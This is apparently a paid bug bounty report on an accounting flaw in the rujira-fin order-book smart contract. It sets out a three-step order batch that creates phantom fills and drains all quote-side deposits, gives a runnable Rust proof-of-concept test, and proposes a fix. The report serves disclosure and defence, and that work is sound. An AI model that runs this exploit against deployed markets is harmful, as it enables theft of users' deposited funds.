Bounty Paid: $500
# Lines of code

https://gitlab.com/thorchain/rujira/-/blob/main/contracts/rujira-fin/src/order_pool/order_manager.rs#L159


# Vulnerability details

## summary

when `execute_new_order` creates a swap that produces `consumed_offer > 0` but `return_amount == 0`, the entire accounting block is skipped. the `consumed_offer` is never deducted from the order manager's `receive` balance. an attacker exploits this by placing an order at an extreme price where integer truncation forces `bids_value` to zero, inflating the bid pool's `sum` without consuming any bids. syncing the attacker's seed order then yields phantom fills equal to the full `consumed_offer`. in a single three-step batch costing only 2 units of base token (which the attacker recovers), the attacker drains the entire quote balance of the contract.

## root cause

`contracts/rujira-fin/src/order_pool/order_manager.rs` - `execute_new_order()` line 159:

```rust
fn execute_new_order(
    &mut self,
    storage: &mut dyn Storage,
    swap_iter: &SwapIter,
    pool: &mut Pool,
    side: &Side,
    target: Option<Uint128>,
    oracle: &impl Premiumable,
) -> Result<(), ContractError> {
    if let Some(target) = target {
        let opposite = side.other();
        let mut swapper = Swapper::new(
            CONTRACT_NAME,
            create_context(&self.config),
            target,
            SwapRequest::Limit {
                price: match opposite {
                    Side::Base => pool.rate(),
                    Side::Quote => pool.rate().inv().unwrap(),
                },
                to: None,
                callback: None,
            },
            self.config.fee_taker,
        );
        let swap = {
            let mut iter = swap_iter.iter(storage, &opposite, oracle);
            swapper.swap(&mut iter)?
        };
        self.response = swapper.context.commit(storage, self.response.clone())?;
        self.response = self.response.clone().add_events(swap.events);
        let order =
            pool.create_order(storage, &self.timestamp, &self.owner, swap.remaining_offer)?;
        if !swap.return_amount.is_zero() {
            // Allocate the swap return to funds sent from user
            self.receive += coin(swap.return_amount.u128(), self.config.denoms.ask(side));
            self.fees += coin(swap.fee_amount.u128(), self.config.denoms.ask(side));
            self.receive = (self.receive.clone()
                - coin(swap.consumed_offer.u128(), self.config.denoms.bid(side)))?;
        }
        // Allocate order size as received amount
        self.send += coin(order.amount().u128(), self.config.denoms.bid(side));
        self.response = self
            .response
            .clone()
            .add_event(event_create_order(pool, &order));
    }
    Ok(())
}
```

the `if !swap.return_amount.is_zero()` guard on line 159 treats `return_amount == 0` as "nothing happened." but a swap can consume the full offer (`consumed_offer == target`) while returning zero bids. when this happens, `consumed_offer` — which can be arbitrarily large, is never subtracted from `receive`. the order cost on line 167 adds zero to `send` because `remaining_offer` is also zero. the balance check at the end of `execute_orders` passes because `receive` was never decremented.

## enabling conditions

two properties of the swap pipeline make this reachable:

### 1. distribute_partial accepts bids_value == 0

`packages/rujira-rs/src/bid_pool/pool.rs`:

```rust
fn distribute_partial(
    &mut self,
    bids_value: Uint256,
    offer: Uint256,
) -> Result<DistributionResult, BidPoolError> {
    let offer_per_bid = DecimalScaled::from_ratio(offer, self.total);

    let sum = self.sum + self.product * offer_per_bid;
    if sum == self.sum {
        return Err(BidPoolError::DistributionError {});
    }

    let ratio = DecimalScaled::one() - DecimalScaled::from_ratio(bids_value, self.total);
    let product = self.product * ratio;

    self.product = product;
    self.sum = sum;

    if self.product == DecimalScaled::zero() {
        return Err(BidPoolError::DistributionError {});
    }

    self.total -= bids_value;
    let snapshots = vec![SumSnapshot::from(*self)];

    Ok(DistributionResult {
        consumed_offer: offer,
        consumed_bids: bids_value,
        snapshots,
    })
}
```

when `bids_value == 0`: `ratio = 1`, `product` unchanged, `total` unchanged, `sum` increases by `offer_per_bid`. the function returns `consumed_offer = offer` and `consumed_bids = 0`. the pool's `sum` is inflated without any bids being consumed, this is the phantom distribution that later manifests as phantom fills.

### 2. swapper limit check is skipped when bids == 0

`packages/rujira-rs/src/exchange/swapper.rs`:

```rust
pub fn swap(&mut self, iter: &mut dyn Iterator<Item = T>) -> Result<SwapResult, SwapError>
where
    T: std::fmt::Debug,
{
    for mut v in iter {
        let mut next_context = self.context.clone();
        let (offer, bids, atts) = v.swap(&mut next_context, self.remaining_offer)?;
        if let SwapRequest::Limit { price: limit, .. } = self.req {
            if !bids.is_zero() {
                let achieved = Decimal::from_ratio(offer, bids);
                if achieved > limit {
                    break;
                }
            }
        }
        self.context = next_context;
        self.events
            .push(trade_event(&v, &self.event_prefix, offer, bids, &atts));
        self.consumed_offer += offer;
        self.remaining_offer -= min(offer, self.remaining_offer);
        self.returned += bids;
        if self.remaining_offer.is_zero() {
            break;
        }
    }

    let fee = Decimal::from_ratio(self.returned, 1u128)
        .mul(self.fee)
        .to_uint_ceil();

    self.returned -= fee;

    // ...

    Ok(SwapResult {
        fee_amount: fee,
        return_amount: self.returned,
        consumed_offer: self.consumed_offer,
        remaining_offer: self.remaining_offer,
        events: self.events.clone(),
    })
}
```

when `bids == 0`, the limit price check on line 49 is bypassed entirely. the context is committed, `consumed_offer` accumulates, and `returned` stays at zero. the final `SwapResult` has `return_amount == 0` and `consumed_offer == target`, which triggers the accounting bypass in `execute_new_order`.

### phantom fills via sync_bid

`packages/rujira-rs/src/bid_pool/pool.rs`:

```rust
pub fn sync_bid(&self, bid: &mut Bid, sum_snapshot: Option<DecimalScaled>) -> StdResult<()> {
    bid.filled += self.bid_filled_amount(bid, sum_snapshot)?;
    bid.amount = self.bid_remaining_amount(bid)?;
    bid.product_snapshot = self.product;
    bid.sum_snapshot = self.sum;
    bid.epoch_snapshot = self.epoch;

    Ok(())
}

fn bid_filled_amount(
    &self,
    bid: &Bid,
    sum_snapshot: Option<DecimalScaled>,
) -> StdResult<Uint256> {
    if bid.product_snapshot.is_zero() {
        return Ok(Uint256::zero());
    }
    if bid.amount.is_zero() {
        return Ok(Uint256::zero());
    }

    let reference_ss = sum_snapshot.unwrap_or(bid.sum_snapshot);
    let res = reference_ss
        .sub(bid.sum_snapshot)
        .mul(bid.amount)
        .div(bid.product_snapshot)
        .to_uint_floor();

    Ok(res)
}
```

after `distribute_partial(0, V)` on a pool with `total = 2`, the pool's `sum` becomes `V / 2`. the attacker's bid was created with `sum_snapshot = 0` and `product_snapshot = 1`. on sync: `filled = (V/2 - 0) * 2 / 1 = V`. the bid now shows `V` units filled despite zero bids being consumed anywhere. claiming these fills withdraws real tokens from the contract.

## attack flow

precondition: the base side of the order book at the extreme price must be empty (no order pools, market makers, or concentrated liquidity ranges). this is trivially satisfied for any extreme price the attacker chooses since no rational participant would place orders there.

all three steps execute in a single `execute_orders` batch. the attacker sends only 2 units of base token.

**step 1** — `(Side::Base, Price::Fixed(10^18), Some(2))`

create a base-side order at price 10^18 with amount 2. the swap attempts to fill against quote-side liquidity but the limit price is `inv(10^18) = 10^-18`, which is below any real order's rate, so the swap breaks immediately with zero fills. the order is created with 2 base tokens in the bid pool. `send += 2 base`.

**step 2** — `(Side::Quote, Price::Fixed(10^18), Some(V))`

create a quote-side order at the same extreme price, targeting `V` (the total quote balance to steal). the swap iterates base-side pools and finds the attacker's own pool from step 1. `Pool::swap` calls `distribute(V, inv(10^18))`. since `bids_value = floor(V * 10^-18) = 0` and `0 + 1 < total(2)`, it routes to `distribute_partial(0, V)`. the pool's `sum` inflates to `V/2`. the swapper sees `bids = 0` so the limit check is skipped and the context is committed to storage. `SwapResult` has `consumed_offer = V` and `return_amount = 0`. back in `execute_new_order`, line 159 skips the entire accounting block. `consumed_offer` (V quote tokens) is never deducted from `receive`.

**step 3** — `(Side::Base, Price::Fixed(10^18), Some(0))`

re-visit the base-side order from step 1. `load_order` calls `sync_bid`, which reads the snapshot committed in step 2 and computes `filled = V`. `maybe_withdraw` claims `V` quote tokens minus maker fee. target 0 retracts the 2 base tokens back into `receive`. the balance check passes because `receive` was never decremented by the stolen `V`.

net result: attacker withdraws `V - fee` quote tokens plus the original 2 base tokens. cost to attacker: gas only.

## impact

direct theft of all quote-side deposits in any rujira-fin market. the attack is:

- **single-transaction**: all three steps execute in one batch
- **zero-capital**: the 2 base tokens used as seed are fully recovered
- **unbounded**: `V` can equal the entire contract balance
- **repeatable**: works on every trading pair independently

## proof of concept

place the following test in `contracts/rujira-fin/src/order_pool/order_manager.rs` inside the existing `mod tests` block.

run with:
```
cargo test -p rujira-fin test_phantom_fill_exploit -- --nocapture
```

```rust
#[test]
fn test_phantom_fill_exploit() {
    let mut deps = mock_dependencies();
    let mut_deps = deps.as_mut();
    let env = mock_env();
    let oracle = Decimal::from_str("1.0").unwrap();
    let config = Config {
        denoms: Denoms::new("ruji", "usdc"),
        oracles: None,
        market_makers: MarketMakers::new(mut_deps.api, vec![]).unwrap(),
        tick: Tick::new(4),
        fee_maker: Decimal::permille(1),
        fee_taker: Decimal::permille(2),
        fee_amm: Decimal::permille(5),
        fee_address: Addr::unchecked("fee_collector"),
        range_delta: Decimal::permille(50),
    };
    let swap_iter = SwapIter::new(mut_deps.querier, &config);

    let victim = Addr::unchecked("victim");
    let mut victim_funds = NativeBalance::default();
    victim_funds += coin(1_000_000, "usdc");
    let mut victim_mgr =
        OrderManager::new(&config, victim, env.block.time, victim_funds);
    let victim_res = victim_mgr
        .execute_orders(
            mut_deps.storage,
            &swap_iter,
            vec![(
                Side::Quote,
                Price::Fixed(Decimal::from_str("1.0").unwrap()),
                Some(Uint128::from(1_000_000u128)),
            )],
            &oracle,
        )
        .unwrap();
    assert_eq!(victim_res.withdraw, NativeBalance::default());

    let attacker = Addr::unchecked("attacker");
    let mut attacker_funds = NativeBalance::default();
    attacker_funds += coin(2, "ruji");
    let extreme_price =
        Decimal::from_str("1000000000000000000").unwrap();
    let mut attacker_mgr =
        OrderManager::new(&config, attacker, env.block.time, attacker_funds);
    let res = attacker_mgr
        .execute_orders(
            mut_deps.storage,
            &swap_iter,
            vec![
                (
                    Side::Base,
                    Price::Fixed(extreme_price),
                    Some(Uint128::from(2u128)),
                ),
                (
                    Side::Quote,
                    Price::Fixed(extreme_price),
                    Some(Uint128::from(1_000_000u128)),
                ),
                (
                    Side::Base,
                    Price::Fixed(extreme_price),
                    Some(Uint128::zero()),
                ),
            ],
            &oracle,
        )
        .unwrap();

    let expected_withdraw =
        NativeBalance(vec![coin(2, "ruji"), coin(999_000, "usdc")]);
    assert_eq!(res.withdraw, expected_withdraw);

    let expected_fees = NativeBalance(vec![coin(1_000, "usdc")]);
    assert_eq!(res.fees, expected_fees);
}
```

result: attacker sends 2 RUJI, receives 999,000 USDC + 2 RUJI. victim's 1,000,000 USDC is drained.

## mitigation

the accounting in `execute_new_order` must always deduct `consumed_offer` regardless of whether `return_amount` is zero. the `consumed_offer` represents real tokens consumed by the swap and must be reflected in the balance.

```rust
// before (vulnerable)
if !swap.return_amount.is_zero() {
    self.receive += coin(swap.return_amount.u128(), self.config.denoms.ask(side));
    self.fees += coin(swap.fee_amount.u128(), self.config.denoms.ask(side));
    self.receive = (self.receive.clone()
        - coin(swap.consumed_offer.u128(), self.config.denoms.bid(side)))?;
}

// after (fixed)
if !swap.return_amount.is_zero() {
    self.receive += coin(swap.return_amount.u128(), self.config.denoms.ask(side));
    self.fees += coin(swap.fee_amount.u128(), self.config.denoms.ask(side));
}
if !swap.consumed_offer.is_zero() {
    self.receive = (self.receive.clone()
        - coin(swap.consumed_offer.u128(), self.config.denoms.bid(side)))?;
}
```
